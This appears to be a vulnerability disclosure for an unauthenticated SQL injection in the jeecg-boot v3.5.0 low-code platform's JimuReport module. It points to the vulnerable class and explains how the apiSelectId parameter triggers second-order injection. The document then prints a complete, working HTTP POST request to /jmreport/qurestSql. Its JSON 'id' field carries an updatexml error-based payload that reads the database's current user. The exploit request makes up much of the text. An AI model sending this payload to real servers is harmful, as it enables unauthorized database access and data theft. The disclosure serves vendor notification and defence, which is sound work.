# Java Low Code Platform for Enterprise web applications jeecg-boot(v3.5.0) latest unauthorized sql injection. 
## The program is built using the idea
## Vulnerability File: jimureport-spring-boot-starter-1.5.6.jar!/org/jeecg/modules/jmreport/desreport/a/a.class
## code
![image](https://user-images.githubusercontent.com/6756211/225226785-921a16d8-d593-46cf-afaa-c01049295897.png)

the params *apiSelectId* will query infos from table jimu_report_db
![image](https://user-images.githubusercontent.com/6756211/225229552-e66847a8-5352-4c0f-a631-94c030f930a3.png)
the column db_dyn_sql in jimu_report_db is a sql statement, and this sql will cause Second Degree injection
![image](https://user-images.githubusercontent.com/6756211/225231234-5c6e87d6-bb7a-439e-91a0-911a4e1ea45d.png)

## payload
![image](https://user-images.githubusercontent.com/6756211/225232140-4bc42acf-91e2-479b-bf6e-a9c797e070f9.png)
![Jietu20230315-151505](https://user-images.githubusercontent.com/6756211/225234485-082b8fa1-2214-4437-beb9-7e937a0c9790.jpg)

```
POST /jeecg-boot/jmreport/qurestSql HTTP/1.1
Host: localhost:8080
Cache-Control: max-age=0
sec-ch-ua: "Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "macOS"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6
Connection: close
Content-Length: 130
Content-Type: application/json;charset=UTF-8

{"apiSelectId":"1290104038414721025",
"id":"1' or '%1%' like (updatexml(0x3a,concat(1,(select current_user)),1)) or '%%' like '"}
```
